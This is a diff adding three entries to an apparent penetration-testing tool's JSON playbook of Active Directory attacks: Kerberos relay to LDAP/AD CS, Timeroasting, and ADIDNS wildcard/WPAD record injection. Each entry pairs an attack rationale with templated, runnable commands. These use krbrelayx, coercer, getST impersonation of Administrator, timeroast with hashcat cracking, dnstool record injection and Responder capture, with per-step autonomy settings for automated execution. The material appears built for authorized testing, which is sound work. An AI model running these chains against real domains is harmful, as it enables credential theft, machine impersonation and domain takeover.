@@ -3096,6 +3096,161 @@
           "note": "With the DC hash you DCSync the domain; krbtgt means a golden ticket and permanent control."
         }
       ]
+    },
+    {
+      "id": "kerberos-relay",
+      "title": "Kerberos Relay (LDAP / AD CS)",
+      "phase": "ad",
+      "hypothesis": "Kerberos authentication can be relayed too, and unlike NTLM it is not stopped by SMB signing. You coerce a privileged machine to authenticate with Kerberos to a name that resolves to you, then relay the AP-REQ to a service with no channel binding: LDAP to write RBCD or shadow credentials on the victim, or AD CS web-enrollment to enrol a certificate as the victim machine. It is the way through when SMB signing is enforced everywhere and the classic NTLM relay is dead.",
+      "tool": "krbrelayx",
+      "tools": [
+        "krbrelayx",
+        "coercer",
+        "certipy"
+      ],
+      "requires_any": [
+        "ad.coerced_auth",
+        "credential.available"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 58,
+      "autonomy": "manual",
+      "sequence": true,
+      "proves": "delegation or a certificate for a victim machine, obtained by relaying its coerced Kerberos ticket",
+      "does_not_prove": "anything where the relay target enforces channel binding, or no coercion vector is reachable",
+      "report": {
+        "finding": "Kerberos relay to LDAP/AD CS for delegation",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://github.com/dirkjanm/krbrelayx"
+      ],
+      "commands": [
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} --gen-relay-list relay.txt",
+          "note": "Signing enforced kills the NTLM relay, which is when the Kerberos relay is the way through."
+        },
+        {
+          "tool": "krbrelayx",
+          "run": "krbrelayx.py -t ldap://{{dc_fqdn}} --add-computer evilpc",
+          "note": "Relay target decides the win: LDAP for RBCD/shadow-cred, AD CS web-enrollment for a certificate."
+        },
+        {
+          "tool": "coercer",
+          "run": "coercer coerce -u {{user}} -p '{{password}}' -t {{target}} -l {{spoofed_name}}",
+          "note": "Coerce the victim to authenticate with Kerberos to a name that resolves to your relay."
+        },
+        {
+          "tool": "certipy",
+          "run": "getST.py -spn cifs/{{victim_fqdn}} -impersonate administrator 'acme.internal/evilpc$:{{password}}'",
+          "note": "With RBCD written, request a ticket impersonating Administrator to the victim: SYSTEM on that host."
+        }
+      ]
+    },
+    {
+      "id": "timeroasting",
+      "title": "Timeroasting (unauthenticated machine hashes)",
+      "phase": "ad",
+      "hypothesis": "The legacy MS-SNTP authentication in the Windows Time service lets a client ask a DC to sign an NTP reply with a computer account NT hash as the key, for any computer RID, with no authentication at all. You collect those signed replies (NetNTLM-style hashes per machine account) and crack them offline. Machine passwords are usually random, but appliances, clusters, and old hosts often carry weak or scripted ones, and cracking one is an unauthenticated foothold.",
+      "tool": "timeroast",
+      "tools": [
+        "timeroast",
+        "hashcat",
+        "nxc"
+      ],
+      "requires_any": [
+        "kerberos.reachable",
+        "port:88",
+        "ad.dc_candidate",
+        "smb.reachable"
+      ],
+      "produces": [
+        "credential.candidate"
+      ],
+      "priority": 40,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "crackable machine-account hashes pulled from a DC with no credential",
+      "does_not_prove": "a usable credential until a hash actually cracks; most machine passwords are random",
+      "report": {
+        "finding": "Timeroasting: unauthenticated machine-account hash disclosure",
+        "severity": "medium"
+      },
+      "refs": [
+        "https://github.com/SecuraBV/Timeroast"
+      ],
+      "commands": [
+        {
+          "tool": "nmap",
+          "run": "nmap -sU -p123 {{target}}",
+          "note": "The Windows Time service on the DC is what answers the signed-reply requests."
+        },
+        {
+          "tool": "timeroast",
+          "run": "python3 timeroast.py {{target}} | tee timeroast.hashes",
+          "note": "Walks computer RIDs and collects a signed hash per account, with no authentication."
+        },
+        {
+          "tool": "hashcat",
+          "run": "hashcat -m 31300 timeroast.hashes {{wordlist}}",
+          "note": "Crack offline; weak or scripted machine passwords on appliances and old hosts fall."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --query '(objectSid=*-{{rid}})' 'sAMAccountName'",
+          "note": "Resolve the cracked RID to a host; a machine credential authenticates as that host."
+        }
+      ]
+    },
+    {
+      "id": "adidns-abuse",
+      "title": "ADIDNS Record Abuse (wildcard / WPAD)",
+      "phase": "ad",
+      "hypothesis": "AD-integrated DNS lets any authenticated user create records by default, which is a sharp primitive. A wildcard record makes you the answer for every name that does not already exist (catching fallback and mistyped lookups); a WPAD record turns on proxy auto-discovery you control; and any record you own is the name a coerced or relayed authentication gets sent to. It is the quiet enabler under many relay chains: you need a name that resolves to your box, and one authenticated LDAP write gives you one.",
+      "tool": "dnstool",
+      "tools": [
+        "dnstool",
+        "responder"
+      ],
+      "requires_any": [
+        "credential.available"
+      ],
+      "produces": [
+        "ad.coerced_auth",
+        "credential.candidate"
+      ],
+      "priority": 44,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "an attacker-controlled DNS name in the domain that captures auth or anchors a relay",
+      "does_not_prove": "access on its own; the record has to actually intercept a client or feed a relay",
+      "report": {
+        "finding": "ADIDNS record injection (wildcard/WPAD)",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.netspi.com/blog/technical-blog/network-penetration-testing/adidns-revisited/"
+      ],
+      "commands": [
+        {
+          "tool": "dnstool",
+          "run": "dnstool.py -u 'acme.internal\\{{user}}' -p '{{password}}' -a add -r '*' -d {{lhost}} {{target}}",
+          "note": "A wildcard answers every name without an explicit record; allow a few minutes to replicate."
+        },
+        {
+          "tool": "dnstool",
+          "run": "dnstool.py -u 'acme.internal\\{{user}}' -p '{{password}}' -a add -r wpad -d {{lhost}} {{target}}",
+          "note": "WPAD turns on proxy auto-discovery pointed at you; often GPO-blocked, so the wildcard is more reliable."
+        },
+        {
+          "tool": "responder",
+          "run": "responder -I {{iface}} -w",
+          "note": "Names that now resolve to you send their authentication to your listener; feed it to the crack or relay."
+        }
+      ]
     }
   ]
 }
